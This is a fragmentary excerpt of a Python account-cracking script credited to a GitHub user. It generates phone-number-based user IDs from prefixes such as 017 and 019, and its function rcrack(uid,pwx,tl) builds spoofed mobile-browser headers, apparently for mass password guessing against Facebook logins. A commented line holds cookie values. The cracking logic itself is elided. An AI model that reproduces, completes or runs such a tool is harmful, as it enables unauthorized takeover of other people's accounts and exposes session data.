...
[Github:              > \33[1;38mShihab99s      \33[1;34m
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    print(f' [{xr}^{x}] Example>: {xr}019,017,018,013,106,014,92302,92301,91778{x}')
    print(" ══════════════════════════════════════════")
    rk1 = '017'
    rk2 = '019'
    rk3 = '018'
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=6jM3ZTURM4Kllj3hBnQtyjCW; sb=6jM3ZUzW9wTsjs3EVUnE97q0; m_pixel_ratio=2; wd=360x708; fr=0s4iy0ILuCuY1NZSB..BlNzPq.70.AAA.0.0.BlNzQ5.AWVa2O6maVI',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH2137"',
